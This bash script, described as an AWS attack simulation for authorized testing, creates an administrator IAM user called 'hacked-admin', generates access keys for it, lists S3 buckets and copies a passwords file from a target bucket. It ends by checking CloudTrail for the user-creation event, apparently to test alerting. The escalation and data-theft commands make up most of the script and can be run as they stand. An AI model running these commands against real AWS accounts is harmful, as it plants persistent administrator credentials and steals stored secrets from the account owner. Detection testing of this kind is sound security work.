#!/bin/bash
# ------------------------------------------------------------------
# AWS IAM Privilege Escalation & Exfiltration Simulation Script
# Note: For educational and authorized testing environments only.
# ------------------------------------------------------------------
set -e # Stop script on any error

TARGET_BUCKET="proj2-data-leak"

echo "[+] Step 1: Verifying Current Identity..."
aws sts get-caller-identity --query "Arn" --output text

echo "[+] Step 2: Executing Privilege Escalation..."
aws iam create-user --user-name hacked-admin
aws iam attach-user-policy --user-name hacked-admin --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

echo "[!] Creating Access Keys (Caution: Secret will be displayed)..."
aws iam create-access-key --user-name hacked-admin

echo "[*] Waiting 10 seconds for IAM global propagation..."
sleep 10

echo "[+] Step 3: Executing Data Exfiltration..."
# Listing buckets to find targets
aws s3 ls
# Syncing sensitive data from the target bucket
aws s3 cp s3://$TARGET_BUCKET/passwords.txt .

echo "[+] Step 4: Verifying Audit Trail Presence..."
# This confirms CloudTrail is capturing the 'CreateUser' event
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=CreateUser --max-results 1

echo "------------------------------------------------------------------"
echo "Simulation Complete. Check CloudWatch/SNS for real-time alerts."
echo "------------------------------------------------------------------"